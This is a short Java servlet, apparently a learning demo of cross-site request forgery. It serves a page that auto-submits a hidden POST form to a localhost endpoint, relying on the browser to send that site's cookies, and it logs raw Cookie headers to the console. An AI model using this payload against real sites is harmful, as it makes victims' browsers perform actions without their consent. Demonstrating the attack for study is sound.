package cn.lkl.demos.web;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class TestServlet implements Servlet {
    private ServletContext context;
    private ServletConfig config;

    @Override
    public void init(ServletConfig config) throws ServletException {
        this.context = config.getServletContext();
        this.config = config;
    }

    @Override
    public ServletConfig getServletConfig() {
        return config;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        if (req instanceof HttpServletRequest) {
            String cookie = ((HttpServletRequest) req).getHeader("cookie");
            System.out.println("=============cookie:" + cookie);
            String referer = ((HttpServletRequest) req).getHeader("Referer");
            System.out.println("=============referer:"+referer);
            String requestURL = ((HttpServletRequest) req).getRequestURL().toString();
            System.out.println("=========url:"+requestURL);
            if(requestURL.lastIndexOf("test/attack") != -1) {
                //攻击  localhost:8080 网站的 demo/test/byAttack 这个地址 请求会自动带对应的cookie
                res.getWriter().write("<html>" +
                        "<body>" +
                        "<form action='http://localhost:8080/demo/test/byAttack' method='post'></form>" +
                        "</body>" +
                        "<script>document.forms[0].submit();</script>" +
                        "</html>");
            }
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
